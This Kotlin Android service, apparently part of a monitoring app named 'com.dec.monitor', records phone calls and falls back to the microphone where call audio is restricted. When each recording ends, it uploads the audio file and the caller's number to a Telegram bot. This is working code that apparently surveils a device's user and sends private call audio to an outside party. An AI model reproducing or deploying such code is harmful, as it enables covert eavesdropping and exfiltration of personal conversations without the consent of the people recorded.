package com.dec.monitor.call

import android.app.*
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class CallRecordingService : Service() {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var callerNumber = "unknown"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        callerNumber = intent?.getStringExtra("number") ?: "unknown"
        startForeground(1, buildNotification())
        startRecording()
        return START_NOT_STICKY
    }

    private fun startRecording() {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        outputFile = File(getExternalFilesDir(null), "call_${timestamp}.mp3")

        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        recorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(128000)
            setOutputFile(outputFile?.absolutePath)
            try {
                prepare()
                start()
                Log.d("CallRecorder", "Recording started: ${outputFile?.name}")
            } catch (e: Exception) {
                Log.e("CallRecorder", "Recording failed: ${e.message}")
                // fallback: try MIC source (works on some devices where VOICE_CALL is restricted)
                reset()
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(outputFile?.absolutePath)
                try { prepare(); start() } catch (e2: Exception) {
                    Log.e("CallRecorder", "MIC fallback also failed: ${e2.message}")
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            recorder?.stop()
            recorder?.release()
        } catch (e: Exception) {
            Log.e("CallRecorder", "Stop error: ${e.message}")
        }
        recorder = null

        outputFile?.let { file ->
            if (file.exists() && file.length() > 0) {
                CoroutineScope(Dispatchers.IO).launch {
                    TelegramBot.sendAudio(file, "🎙 Call recording\nNumber: $callerNumber")
                }
            }
        }
    }

    private fun buildNotification(): Notification {
        val channelId = "call_recorder"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Call Recorder", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Recording call...")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
